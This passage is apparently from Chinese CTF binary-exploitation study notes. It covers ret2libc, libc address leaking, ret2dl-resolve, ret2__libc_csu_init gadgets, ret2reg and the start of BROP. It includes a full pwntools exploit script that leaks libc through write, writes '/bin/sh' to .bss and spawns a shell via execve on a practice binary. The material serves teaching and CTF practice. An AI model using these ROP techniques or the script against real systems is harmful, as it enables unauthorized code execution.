+<img src="CTF PWN6_files/1307q7hoio2iq24mabnfd7a3k9.png"></p>
+<h3 class="topic">
+<a name="1kjcp4033c7h3ikaan9e2g3tk3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里obj.dump("system")得到的结果是一个偏移，可以类比上面代码中的lib.symbols['system']</a>
+</h3>
+<h3 class="topic">
+<a name="53d2punt9g9nsp4fs4ilgvps97">&nbsp;&nbsp;&nbsp;&nbsp;本例中如果程序中没有system 也可以获得libc中的execve函数地址，从而执行execve('/bin/sh') 获得shell</a>
+</h3>
+<h3 class="topic">
+<a name="4fcs8utks4d0vntv3am4ejvu57">&nbsp;&nbsp;&nbsp;&nbsp;利用思路和exp</a>
+</h3>
+<h3 class="topic">
+<a name="786ugef1t17e3d1cd4ioa5kg42">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用思路</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/5dh8nuit9f6spfj6vr5tbotseb.png"></p>
+<h3 class="topic">
+<a name="418b5n78lidat4gvjriurf20qf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exp布局</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/7a2eg2rmu9gard8dug0e918m78.png"></p>
+<h3 class="topic">
+<a name="7pgcoi7p12bm1v4ggf13cd5a6v">&nbsp;&nbsp;&nbsp;&nbsp;train.cs.nctu.edu.tw: ret2libc</a>
+</h3>
+<h3 class="topic">
+<a name="6lghcp7htfc84i5cqpaddulitm">&nbsp;&nbsp;总结</a>
+</h3>
+<h3 class="topic">
+<a name="49bioobmkdlfamoft085mdfnso">&nbsp;&nbsp;&nbsp;shell的获取方法</a>
+</h3>
+<h3 class="topic">
+<a name="7jnsiolc334gem3ljtavaa7mmr">&nbsp;&nbsp;&nbsp;&nbsp;执行shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="0aor9aov25l20pfgp1sa3cu2kn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/5ttn82i8ek01f73r056gcctkup.png"></p>
+<h3 class="topic">
+<a name="3e24p2auuasi7i8k0hip9ugbno">&nbsp;&nbsp;&nbsp;&nbsp;执行system('/bin/sh')  system('sh')等</a>
+</h3>
+<h3 class="topic">
+<a name="4ilb71p6m5e6g0tm7b388hnd4u">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/3d1tug7t3qrbvtqer8s9p2fcov.png"></p>
+<h3 class="topic">
+<a name="150d5t2oidjk6qanvn88vftdnf">&nbsp;&nbsp;&nbsp;&nbsp;执行 execve("/bin/sh",NULL,NULL)</a>
+</h3>
+<h3 class="topic">
+<a name="7fm0o0l6n8beo2b6vpea28fn1g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/5eepiblt3m3of3oj074jeaqiit.png"></p>
+<h3 class="topic">
+<a name="3u96u23q04bbuqn0e1os6te4k4">&nbsp;&nbsp;&nbsp;&nbsp;执行系统调用</a>
+</h3>
+<h3 class="topic">
+<a name="25or3gnfuqlkn69n082kllvv7p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/4h8ufv96hql5g3bgpukj2asa5o.png"></p>
+<h3 class="topic">
+<a name="4l2076ea8sou9efsl3smu6d706">&nbsp;&nbsp;&nbsp;地址寻址</a>
+</h3>
+<h3 class="topic">
+<a name="298ol1cmvmq27vsqq6ifjrf6j0">&nbsp;&nbsp;&nbsp;&nbsp;通用寻址</a>
+</h3>
+<h3 class="topic">
+<a name="533ko8121j8djo5p5p2prcr94k">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直接地址寻址</a>
+</h3>
+<h3 class="topic">
+<a name="0c5sgaujtogp0n0dr088dpncre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序中已经给出了相关变量或者函数的地址了。这时候，我们就可以直接进行利用了。</a>
+</h3>
+<h3 class="topic">
+<a name="61m2pdut6nkd3aorldhm7vt0qi">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;got表寻址</a>
+</h3>
+<h3 class="topic">
+<a name="6h801496nuqg2l6vpavd3bcq5f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有时候我们并不一定非得直接知道某个函数的地址，可以利用 GOT 表跳转到对应函数的地址。当然，如果我们非得知道这个函数的地址，我们可以利用 write，puts 等输出函数将 GOT 表中地址处对应的内容输出出来（前提是这个函数已经被解析一次了）。</a>
+</h3>
+<h3 class="topic">
+<a name="20ac5cbubi74vrqfal4iser6l8">&nbsp;&nbsp;&nbsp;&nbsp;有libc</a>
+</h3>
+<h3 class="topic">
+<a name="79l79sj0cg1m4t1chg0dmm299n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相对偏移寻找，这时候我们就需要考虑利用 libc 中函数的基地址一样这个特性来寻找了。比如我们可以通过 __libc_start_main 的地址来泄漏 libc 在内存中的基地址。注意：不要选择有wapper的函数，这样会使得函数的基地址计算不正确。常见的有wapper 的函数有？（待补充）。</a>
+</h3>
+<h3 class="topic">
+<a name="6egbo82s0c4dnqh05j51h2a0v8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;类似于ret2libc中例3</a>
+</h3>
+<h3 class="topic">
+<a name="4g8jbkjoqmt0gjj23huvrfp4eb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时如果有libc，可以将libc与exp放在同一个目录，然后在exp中使用   &#13;
+lib=EFL(libc库路径)&#13;
+lib.got[]&#13;
+lib.plt[]&#13;
+lib.symbols[]&#13;
+等方式获得libc中函数的地址</a>
+</h3>
+<h3 class="topic">
+<a name="7bbpus2g57h4i2cp2p56806ae8">&nbsp;&nbsp;&nbsp;&nbsp;无llibc</a>
+</h3>
+<h3 class="topic">
+<a name="267gmu8f4k69fjpi8uvl529t6n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;两种思路</a>
+</h3>
+<h3 class="topic">
+<a name="0pfm9j20eotn47hjq2fhq6inp0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设法获得libc</a>
+</h3>
+<h3 class="topic">
+<a name="48bbkesgd7kd3so3nhhc3aetea">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设法直接获得相应的地址</a>
+</h3>
+<h3 class="topic">
+<a name="3dc5312pnn4os3vkfn9e05pth7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了直接获得地址，一般需要使用 puts ， write，printf 等函数，puts和printf函数存在\x00截断问题，当目标地址中中存在\x00时可能会输出不完全、write 可以指定长度输出的内容。</a>
+</h3>
+<h3 class="topic">
+<a name="5iviv69sgp8hb7o8r5vkq6fk2i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获得地址的方法</a>
+</h3>
+<h3 class="topic">
+<a name="4sg23toq621sqvjcl6alc7v3gq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pwnlib.dynelf</a>
+</h3>
+<h3 class="topic">
+<a name="74lins825evjfu3qda47eaoo7l">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/5u19l3e3cdnppvo02o4h5pj7qe.png"></p>
+<h3 class="topic">
+<a name="290eg4nm6u63u9gaqristvader">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://pwntools-docs-zh.readthedocs.io/zh_CN/latest/dynelf.html</a>
+</h3>
+<h3 class="topic">
+<a href="https://www.anquanke.com/post/id/85129" name="2t5gv36il7n5nfrlbvgqe6bja8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.anquanke.com/post/id/85129</a>
+</h3>
+<h3 class="topic">
+<a name="6dafse652ii15ooikij8crv3a4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此文章中介绍了64位系统中使用dynelf，使用puts、write函数的传参方式__libc_csu_init</a>
+</h3>
+<h3 class="topic">
+<a name="568jtkf36c7jm4obobpsh6pvhh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x64下利用通用gadgets调用一个参数、两个参数、三个参数函数的方法&#13;
+https://www.cnblogs.com/Ox9A82/p/5487725.html</a>
+</h3>
+<h3 class="topic">
+<a name="1he92bbejs33pbukdlc5mokbmu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.freebuf.com/articles/system/193646.html</a>
+</h3>
+<h3 class="topic">
+<a name="5nn2n9b7ttk4kd4ebqireshnbv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重要这篇文章中因为可执行程序是32位的，参数使用栈传输，所以write puts函数的调用比较方便</a>
+</h3>
+<h3 class="topic">
+<a name="64kudotn530tel1g756g8ni9ft">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32位ELF dynelf使用例子</a>
+</h3>
+<h3 class="topic">
+<a name="43s88gibcina0tqaa9t7r7nqc0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;源代码</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/0knss9boi41c9vmd7108o22vrk.png"></p>
+<h3 class="topic">
+<a name="4dpsnka78hn1vth23o09kv3fap">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exp</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/2tuba8dkio2q6pe4f6a3rvrbg9.png"></p>
+<h3 class="topic">
+<a name="3uprp5gimi4bmu246870kfvj3a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.jianshu.com/p/daf0b0cb3c91</a>
+</h3>
+<h3 class="topic">
+<a name="1vn7501rejo2hqleaqqa1to8hf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.jianshu.com/p/4404cc01a702</a>
+</h3>
+<h3 class="topic">
+<a name="738qegkdm8r36um8r68i206t9r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.jianshu.com/p/f10fc2e11c1d</a>
+</h3>
+<h3 class="topic">
+<a name="5ve85anq7ieqoack85p3sjjndf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html</a>
+</h3>
+<h3 class="topic">
+<a name="5hsul981rfqa2pvhpel7fbv5u6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libc数据库</a>
+</h3>
+<h3 class="topic">
+<a name="5qlc2fa55rodenaeevatmva2mq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/7oe8iga9it4nkr2ugrb4md6kjr.png"></p>
+<h3 class="topic">
+<a name="5rl4dckuq3qveh47ger5709uf4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.jianshu.com/p/daf0b0cb3c91</a>
+</h3>
+<h3 class="topic">
+<a name="2c2kpo0dm2l0e47l51qa421u3c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret2dl-resolve</a>
+</h3>
+<h3 class="topic">
+<a name="5gbfk1dtiqspjvnm5d77v8j2pg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/5psh9io14qs2bkjaa64ltidq6h.png"></p>
+<h3 class="topic">
+<a name="0hj7vkm80tv9dan9v8rq0qr0oh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当动态链接时，某函数第一次执行时会通过plt表项调用_dl_runtime_resolve函数，该函数解析指定函数的地址然后将其填入got表中</a>
+</h3>
+<h3 class="topic">
+<a name="2d2d367r3gsv1812ek8mspvaa5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret2dl-resolve即通过构造gadget模拟_dl_runtime_resolve的执行，从而获得函数地址</a>
+</h3>
+<h3 class="topic">
+<a name="3grqeapdp6crt830d2q0n3q4kv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;高级ROP中介绍</a>
+</h3>
+<h3 class="topic">
+<a name="7kif5it5ef5qo9l98h5kj9mfi4">&nbsp;&nbsp;推荐题目</a>
+</h3>
+<h3 class="topic">
+<a name="4ev9kg8i85r4rv64uh6i8lnc8b">&nbsp;&nbsp;&nbsp;train.cs.nctu.edu.tw: rop</a>
+</h3>
+<h3 class="topic">
+<a name="37qeumkgk7qlsk2kgebo0uabhf">&nbsp;&nbsp;&nbsp;2013-PlaidCTF-ropasaurusrex</a>
+</h3>
+<h3 class="topic">
+<a name="7pmk3b764bf15aq4jt5ekfvprk">&nbsp;&nbsp;&nbsp;Defcon 2015 Qualifier: R0pbaby</a>
+</h3>
+<h3 class="topic">
+<a name="2g8en81ac9lua6ssaoj8bsdur0">&nbsp;&nbsp;参考阅读</a>
+</h3>
+<h3 class="topic">
+<a name="5pjij2rkk0k49rt4himvgifqnv">&nbsp;&nbsp;&nbsp;乌云一步一步ROP篇(蒸米)</a>
+</h3>
+<h3 class="topic">
+<a name="34g7u98hvfmpi2icsbqq7mtv1q">&nbsp;&nbsp;&nbsp;手把手教你栈溢出从入门到放弃（上）</a>
+</h3>
+<h3 class="topic">
+<a name="244ath69v254jgeu08jrb9qv42">&nbsp;&nbsp;&nbsp;手把手教你栈溢出从入门到放弃（下）</a>
+</h3>
+<h3 class="topic">
+<a name="1qq3f8lijivqckfh2dt45i61it">&nbsp;&nbsp;&nbsp;【技术分享】现代栈溢出利用技术基础：ROP</a>
+</h3>
+<h3 class="topic">
+<a name="4j1ivgmm0oo9fmuk590ielk1n6">&nbsp;中级rop</a>
+</h3>
+<h3 class="topic">
+<a name="4e2d0o4bsl7qkdqqebeqgpfs4r">&nbsp;&nbsp;ret2__libc_csu_init</a>
+</h3>
+<h3 class="topic">
+<a name="2g1b5al4n88vsakd7b39rb7q4q">&nbsp;&nbsp;&nbsp;该技术是指返回到__libc_csu_init 函数中执行gadget，即将该函数中的代码作为gadget</a>
+</h3>
+<h3 class="topic">
+<a name="17tmb8q0mv7ah5ehi6sbdtcqrq">&nbsp;&nbsp;&nbsp;&nbsp;该函数用于对libc进行初始化，一般函数均会使用到libc，所以该函数一般存在（不同版本的libc该函数可能存在差别）</a>
+</h3>
+<h3 class="topic">
+<a name="3ftidnsshhv0uj5oreu005fftp">&nbsp;&nbsp;&nbsp;函数汇编</a>
+</h3>
+<h3 class="topic">
+<a name="2sjpq1pajd4m2igkfupnfg08ch">&nbsp;&nbsp;&nbsp;&nbsp;.text:00000000004005C0 ; void _libc_csu_init(void)&#13;
+.text:00000000004005C0                 public __libc_csu_init&#13;
+.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16&#24;o&#13;
+.text:00000000004005C0                 push    r15&#13;
+.text:00000000004005C2                 push    r14&#13;
+.text:00000000004005C4                 mov     r15d, edi&#13;
+.text:00000000004005C7                 push    r13&#13;
+.text:00000000004005C9                 push    r12&#13;
+.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry&#13;
+.text:00000000004005D2                 push    rbp&#13;
+.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry&#13;
+.text:00000000004005DA                 push    rbx&#13;
+.text:00000000004005DB                 mov     r14, rsi&#13;
+.text:00000000004005DE                 mov     r13, rdx&#13;
+.text:00000000004005E1                 sub     rbp, r12&#13;
+.text:00000000004005E4                 sub     rsp, 8&#13;
+.text:00000000004005E8                 sar     rbp, 3&#13;
+.text:00000000004005EC                 call    _init_proc&#13;
+.text:00000000004005F1                 test    rbp, rbp&#13;
+.text:00000000004005F4                 jz      short loc_400616&#13;
+.text:00000000004005F6                 xor     ebx, ebx&#13;
+.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]&#13;
+.text:0000000000400600&#13;
+.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54&#25;j&#13;
+.text:0000000000400600                 mov     rdx, r13&#13;
+.text:0000000000400603                 mov     rsi, r14&#13;
+.text:0000000000400606                 mov     edi, r15d&#13;
+.text:0000000000400609                 call    qword ptr [r12+rbx*8]&#13;
+.text:000000000040060D                 add     rbx, 1&#13;
+.text:0000000000400611                 cmp     rbx, rbp&#13;
+.text:0000000000400614                 jnz     short loc_400600&#13;
+.text:0000000000400616&#13;
+.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34&#24;j&#13;
+.text:0000000000400616                 add     rsp, 8&#13;
+.text:000000000040061A                 pop     rbx&#13;
+.text:000000000040061B                 pop     rbp&#13;
+.text:000000000040061C                 pop     r12&#13;
+.text:000000000040061E                 pop     r13&#13;
+.text:0000000000400620                 pop     r14&#13;
+.text:0000000000400622                 pop     r15&#13;
+.text:0000000000400624                 retn&#13;
+.text:0000000000400624 __libc_csu_init endp</a>
+</h3>
+<h3 class="topic">
+<a name="5e30cg3cqc7rihg0bklgmod2t3">&nbsp;&nbsp;&nbsp;可以利点的点</a>
+</h3>
+<h3 class="topic">
+<a name="2r231oaecunisp15csndorur7v">&nbsp;&nbsp;&nbsp;&nbsp;可以用于控制rbx,rbp,r12,r13,r14,r15 寄存器的数据</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/11vf7jsljlmk1pssgtc969b4dq.png"></p>
+<h3 class="topic">
+<a name="5kanu9i79f36a7v7ac6p36oo4g">&nbsp;&nbsp;&nbsp;&nbsp;前三个指令可以赋值rdx rsi edi (mov edi，r15d只能赋值rdi低32位的edi，高32位会置0) &#13;
+此时 rdi rsi rdx正好是x64用于保存前三个参数的寄存器，之后的call指令可以通过控制r12和rbx，从而执行任意函数调用</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/4bsq60pr3vj38cot313c0p7mih.png"></p>
+<h3 class="topic">
+<a name="3h4u23v1i2483cj9dlgvao3ef9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;64位linux参数传递确实是按照rdi、rsi、rdx、rcx、r8、r9的顺序存放第一个参数到第六个参数。对于超出6个参数的入参还是和32位机器一样放入栈中。</a>
+</h3>
+<h3 class="topic">
+<a name="5d11bfd5eq2puk8fj9pvcknfov">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于windows中x64传参前四个参数使用 rcx rdx r8 r9寄存器传参，其他的参数使用栈传递</a>
+</h3>
+<h3 class="topic">
+<a name="48k1k6cjhmhmhts5rvj3s7fg90">&nbsp;&nbsp;&nbsp;&nbsp;只要控制rbb==rbp就可以保证程序不进行跳转</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/25phupktvsj6pstiep8eubjf1d.png"></p>
+<h3 class="topic">
+<a name="6ipbbctqqbbnq74q9e2od70vma">&nbsp;&nbsp;&nbsp;程序示例</a>
+</h3>
+<h3 class="topic">
+<a name="57n7jpkintr42aqkccb5php86r">&nbsp;&nbsp;&nbsp;&nbsp;本例与之前ret2libc例三相同点在原本可执行程序中均没有system和'/bin/sh',都需要通过泄露函数地址，从而从libc中获得system和'/bin/sh'的地址，&#13;
+本质区别在于本例是64位程序所以参数传递使用到寄存器，而ret2libc例三中是32位程序，参数通过栈传递，获得输出函数地址后，通过溢出就可以在栈中布置好参数，但是本例如果要构建参数，需要是使用到__libc_csu_init函数中的指令作为gadget</a>
+</h3>
+<h3 class="topic">
+<a name="77ms4k1ger68j1udfqcfo4651n">&nbsp;&nbsp;&nbsp;&nbsp;实例源码与保护机制</a>
+</h3>
+<h3 class="topic">
+<a name="36abbkdmetc052gotq4l19l502">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/1h9rok9j7vc4ljnk4grauls63q.png"></p>
+<h3 class="topic">
+<a name="1e13qisk41v861q0aolhvbmg0a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/6ps4l78njldsn09dk1d5gg7ij8.png"></p>
+<h3 class="topic">
+<a name="0k8bd85abvip8jkops0brf7mv9">&nbsp;&nbsp;&nbsp;&nbsp;exp基本思路</a>
+</h3>
+<h3 class="topic">
+<a name="1skkjgdl1bddo79ntffigqjf01">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/5g31lr7q99r6gnpotdjoptcqn8.png"></p>
+<h3 class="topic">
+<a name="7bp3fgo1vubf5nshofb2nv0dbp">&nbsp;&nbsp;&nbsp;&nbsp;exp</a>
+</h3>
+<h3 class="topic">
+<a name="61edfaqck43e9j2atge5r6j7no">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;代码</a>
+</h3>
+<h3 class="topic">
+<a name="61psvli7s49hh0cp400i5l1de3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;from pwn import *&#13;
+from LibcSearcher import LibcSearcher&#13;
+&#13;
+#context.log_level = 'debug'&#13;
+&#13;
+level5 = ELF('./level5')&#13;
+sh = process('./level5')&#13;
+&#13;
+write_got = level5.got['write']&#13;
+read_got = level5.got['read']&#13;
+main_addr = level5.symbols['main']&#13;
+bss_base = level5.bss()&#13;
+csu_front_addr = 0x0000000000400600&#13;
+csu_end_addr = 0x000000000040061A&#13;
+fakeebp = 'b' * 8&#13;
+&#13;
+&#13;
+def csu(rbx, rbp, r12, r13, r14, r15, last):&#13;
+    # pop rbx,rbp,r12,r13,r14,r15&#13;
+    # rbx should be 0,&#13;
+    # rbp should be 1,enable not to jump&#13;
+    # r12 should be the function we want to call&#13;
+    # rdi=edi=r15d&#13;
+    # rsi=r14&#13;
+    # rdx=r13&#13;
+    payload = 'a' * 0x80 + fakeebp&#13;
+    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(&#13;
+        r13) + p64(r14) + p64(r15)&#13;
+    payload += p64(csu_front_addr)&#13;
+    payload += 'a' * 0x38&#13;
+    payload += p64(last)&#13;
+    sh.send(payload)&#13;
+    sleep(1)&#13;
+&#13;
+&#13;
+sh.recvuntil('Hello, World\n')&#13;
+## RDI, RSI, RDX, RCX, R8, R9, more on the stack&#13;
+## write(1,write_got,8)&#13;
+csu(0, 1, write_got, 8, write_got, 1, main_addr)&#13;
+&#13;
+write_addr = u64(sh.recv(8))&#13;
+libc = LibcSearcher('write', write_addr)&#13;
+libc_base = write_addr - libc.dump('write')&#13;
+execve_addr = libc_base + libc.dump('execve')&#13;
+log.success('execve_addr ' + hex(execve_addr))&#13;
+##gdb.attach(sh)&#13;
+&#13;
+## read(0,bss_base,16)&#13;
+## read execve_addr and /bin/sh\x00&#13;
+sh.recvuntil('Hello, World\n')&#13;
+csu(0, 1, read_got, 16, bss_base, 0, main_addr)&#13;
+sh.send(p64(execve_addr) + '/bin/sh\x00')&#13;
+&#13;
+sh.recvuntil('Hello, World\n')&#13;
+## execve(bss_base+8)&#13;
+csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)&#13;
+sh.interactive()</a>
+</h3>
+<h3 class="topic">
+<a name="281uee310qfa3a3hha3c9l9bel">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/3s03rg1s495bo4j6fd0aa1pcuv.png"></p>
+<h3 class="topic">
+<a name="6ae29ta1ve0oikpu2r6qfptjrf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后之所以使用0x38作为溢出偏移，是因为call[rax+rbx*8]返回后会继续执行连续pop，然后执行ret，0x38即覆盖次retn对应的栈空间</a>
+</h3>
+<h3 class="topic">
+<a name="3ad4bdvuqa3onco3i8rmccq481">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/0hbalhr5o92f1t5f04n6uaj5cv.png"></p>
+<h3 class="topic">
+<a name="442rhv9kd1dtsmj1e15h2jj0tj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/54a53qvhhusidtq4nqa5qnq0hl.png"></p>
+<h3 class="topic">
+<a name="6sdaqh6qvvnqdtq41edr39h4cq">&nbsp;&nbsp;&nbsp;优化思路</a>
+</h3>
+<h3 class="topic">
+<a name="4blrc3dho72hdt68spqi6ujnjg">&nbsp;&nbsp;&nbsp;&nbsp;这样进行漏洞利用，就要求输入大量数据产生溢出，但是有的漏洞不允许溢出过长的数据，此时可以有两种改进思路</a>
+</h3>
+<h3 class="topic">
+<a name="2d8stqr573rmvaspgsg3n3531g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/0nd7q4p3egnrrgi4nk1b0v7vpe.png"></p>
+<h3 class="topic">
+<a name="4ipb6tpsh1f97462ha8bbbqjsn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/0evfr5sbc1hntu6tf8c1bhd2an.png"></p>
+<h3 class="topic">
+<a name="5i08l9fgil6fjmcusignj34rkd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/1a9mm6otq45fhackd8jjkv53m6.png"></p>
+<h3 class="topic">
+<a name="5009ir57umfomam142g5j2dtgk">&nbsp;&nbsp;&nbsp;gadget来源的选择</a>
+</h3>
+<h3 class="topic">
+<a name="4vbnec1ckt5c6ois3ql3hbe36i">&nbsp;&nbsp;&nbsp;&nbsp;gcc默认会将以上函数编译进程序中，可以使用以上函数中的指令片段作为gadget</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/76lfooi9p1f40qivrh9ukr1ffk.png"></p>
+<h3 class="topic">
+<a name="2p7r0pfclqap8834ujdfbivvtm">&nbsp;&nbsp;&nbsp;通过在原有指令地址+偏移的位置处执行指令，同一段gadget可以提供不同功能，前提是这样被执行的指令不会导致程序崩溃</a>
+</h3>
+<h3 class="topic">
+<a name="5b2nthjqpl8984edipkia0r03j">&nbsp;&nbsp;&nbsp;&nbsp;以libc_csu_init 为例</a>
+</h3>
+<h3 class="topic">
+<a name="220hhqlqrdj6dv1f96vckh9jca">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/3f3sqs71mc3r5gmmq5941upakk.png"></p>
+<h3 class="topic">
+<a name="4bc2rsbkl2o7v3l6tb6btavr5b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/5raoj5d7pbu26irri1gvt5r8jn.png"></p>
+<h3 class="topic">
+<a name="75a6359to1ebvtfr5uf3o116te">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本质上是访问一条指令的中间位置，将一条指令的opcode从中间开始解释，从而执行不同的功能</a>
+</h3>
+<h3 class="topic">
+<a name="52733v916a3032t1ic78559u33">&nbsp;&nbsp;&nbsp;相关题目</a>
+</h3>
+<h3 class="topic">
+<a name="4b2g53sg0ce67ck0vl75r6m9b7">&nbsp;&nbsp;&nbsp;&nbsp;2016 XDCTF pwn100</a>
+</h3>
+<h3 class="topic">
+<a name="40kbjrpeljjrqg9mpilj39spoo">&nbsp;&nbsp;&nbsp;&nbsp;2016 华山杯 SU_PWN</a>
+</h3>
+<h3 class="topic">
+<a name="2lf8fmceetr7bns55e80cnsp18">&nbsp;&nbsp;ret2reg</a>
+</h3>
+<h3 class="topic">
+<a name="7gnsfeu521tvrjmqlth7ack34o">&nbsp;&nbsp;&nbsp;即程序溢出之前，某寄存器指向可以执行的缓冲区，则可以将call reg或jmp reg指令的地址覆盖在返回地址处，然后将shellcode覆盖到rag指向的缓冲区</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/1qb7cp5ngme70j93g09p4kvibv.png"></p>
+<h3 class="topic">
+<a name="7dt0fvg5pd7fmom0ihp7tqvgfs">&nbsp;&nbsp;BROP</a>
+</h3>
+<h3 class="topic">
+<a name="708kvqeifh0t66i9hjj8rtae7b">&nbsp;&nbsp;&nbsp;BROP是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。</a>
